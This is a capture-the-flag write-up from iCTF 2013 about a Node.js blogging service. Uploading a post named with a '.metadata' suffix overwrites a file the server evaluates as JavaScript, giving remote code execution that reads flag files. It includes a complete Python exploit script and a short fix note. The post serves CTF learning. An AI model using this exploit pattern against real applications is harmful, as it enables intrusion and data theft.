---
title: iCTF 2013 curiosityblogging writeup
author: zTrix
layout: post
permalink: /ictf-2013-curiosity-writeup/
categories:
  - Uncategorized
---
This is a web blogging system written using nodejs.

After some play and test, We find out that, it&#8217;s a blog posting system, people can read posts and upload posts.

Then We carefully read through its core logic code. The code reveals that there is a &#8220;store&#8221; interface for iCTF servers to push flags to the system. And the there is a dir called &#8220;flags&#8221;, so our goal is to hack the web and capture the flags from the &#8220;flags&#8221; directory.

Reviewing the code, we know that, when users create a post, the blogging system will first store its content in a plain text file, then store a metadata file using &#8220;.metadata&#8221; as extended filename. And the metadata file only contains the length of the post surrounded by brackets, such as &#8220;[36]&#8220;.

Soon after that, we noted that, in &#8220;metadata.js&#8221;, it exports a function called checkfile, which do metafile checking by execute the metadata file as javascript in a new context. Haha, it&#8217;s time for us to show our [RCE][1] skills!

The solution is straightforward now. First we upload a random post to the server, say &#8220;abc&#8221;. At this time, the server will write abc and abc.metadata in the posts dir. Then we can upload a file using abc.metadata as the name, so the real metadata of the abc will be overwritten. The content of the newly uploaded abc.metadata is some javascript code, which will read file content from flags dir and store them in posts dir, say, stored as flag and flag.metadata.

After all of above prepared, we just fire a hit to get post for abc, it will cause the abc.metadata executed, so our javascript code will store the flag in posts dir, then we can visit that post to get the flag.

Here is the complete code for this exploit:

    class Exploit():
    
      def exploit_curiosity_blogging(self, ip, port, flag_id):
        import httplib, time
        conn = httplib.HTTPConnection(ip, port)
        chunk = 'xxx' * 10
        headers = {}
        conn.request("POST", "/upload?name=___", chunk, headers)
        conn.getresponse().read()
    
        js = "    var fs = require('fs'); var content = fs.readFileSync('flags/" 
            + flag_id 
            + "'); fs.writeFileSync('posts/zzz', content); fs.writeFileSync('posts/zzz.metadata', '[' + content.length + ']'); "
        conn = httplib.HTTPConnection(ip, port)
        conn.request("POST", "/upload?name=___.metadata", js, headers)
        conn.getresponse().read()
    
        conn = httplib.HTTPConnection(ip, port)
        conn.request("GET", "/read?id=___")
        response = conn.getresponse()
        s = response.read()
    
        conn = httplib.HTTPConnection(ip, port)
        conn.request("GET", "/read?id=zzz")
        response = conn.getresponse()
        s = response.read()
        index = s.find('<p>')
        index2 = s.find('</p>')
        s = s[index + 3: index2].strip()
        ary = s.split('\n')
        if len(ary) &gt; 1:
          return ary[1]
        else:
          return ''
    
      def execute(self, ip, port, flag_id):
        self.flag = self.exploit_curiosity_blogging(ip, port, flag_id);
    
      def result(self):
        return {'FLAG' : self.flag }
    

Knowing the exploit, it&#8217;s easy now to fix. The best way is to modify the checkfile function in metadata.js to remove the [RCE][1] problem. Actually we fix this problem by disable uploading of posts end with &#8220;.metadata&#8221;, in this way we only need to modify one line, but may be less secure.

Many thanks to Chao Liu who showed expert level hacking skills working with me, he inspired me with ideas, and helped me write the exploit code.

 [1]: http://en.wikipedia.org/wiki/Arbitrary_code_execution